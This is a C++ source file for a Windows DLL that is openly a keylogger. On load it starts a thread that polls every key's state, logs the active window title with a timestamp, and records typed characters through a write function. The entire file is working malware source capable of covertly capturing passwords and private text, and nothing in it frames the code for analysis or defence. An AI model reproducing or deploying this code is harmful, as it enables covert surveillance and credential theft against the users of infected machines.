#include "stdafx.h"
#include "keylogger.h"

extern "C" _declspec(dllexport)
DWORD WINAPI keylogger(LPVOID lpParam)
{
	HWND activeWindow;
	char windowTitle[1024];
	int titleLen;
	std::string prevWindowTitle = "";
	int key;

	time_t tt;
	struct tm * ti;

	while (1)
	{
		Sleep(1);

		// display the active window title
		activeWindow = GetForegroundWindow();
		titleLen = 1 + GetWindowTextLength(activeWindow);

		GetWindowTextA(activeWindow, windowTitle, titleLen);

		// local time variables
		time(&tt);
		ti = localtime(&tt);

		// log the window title
		if (prevWindowTitle != windowTitle)
		{
			writeData("\n\nWINDOW: ");
			writeData(windowTitle);
			writeData("\n");
			writeData("TIME: ");
			writeData(asctime(ti));
			prevWindowTitle = windowTitle;
		}

		// log all regular keys
		for (key = 8; key <= 255; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				if (!(isKeyListed(key)))
				{
					if (isCaps())
						writeData(std::string(1, key));
					else
						writeData(std::string(1, char(tolower(key))));
				}
			}
		}
	}
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		CreateThread(NULL, NULL, keylogger, NULL, NULL, NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

